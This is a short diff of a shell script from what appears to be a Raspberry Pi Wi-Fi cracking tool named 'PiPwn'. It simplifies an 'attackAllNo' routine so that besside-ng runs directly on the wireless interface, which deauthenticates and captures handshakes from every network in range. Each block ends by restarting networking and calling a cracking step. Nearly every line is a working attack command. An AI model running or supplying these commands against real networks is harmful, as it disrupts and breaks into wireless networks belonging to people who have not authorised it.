@@ -308,11 +308,8 @@ sleep 3
 echo "Remeber to check your spam folder!"
 network
 PiPwn
-sudo airmon-ng check kill
-sudo airmon-ng
-sudo airmon-ng start $foo
-sudo besside-ng wlam0mon
-sudo airmon-ng stop $foo
+sudo besside-ng $foo
+stopMon
 sudo ifconfig $foo up
 sudo systemctl start NetworkManager
 sudo chmod -R 755 air-crack
@@ -326,11 +323,8 @@ crack
 attackAllNo () {
 network
 PiPwn
-sudo airmon-ng check kill
-sudo airmon-ng
-sudo airmon-ng start $foo
-sudo besside-ng wlam0mon
-sudo airmon-ng stop $foo
+sudo besside-ng $foo
+stopMon
 sudo ifconfig $foo up
 sudo systemctl start NetworkManager
 sudo chmod -R 755 air-crack
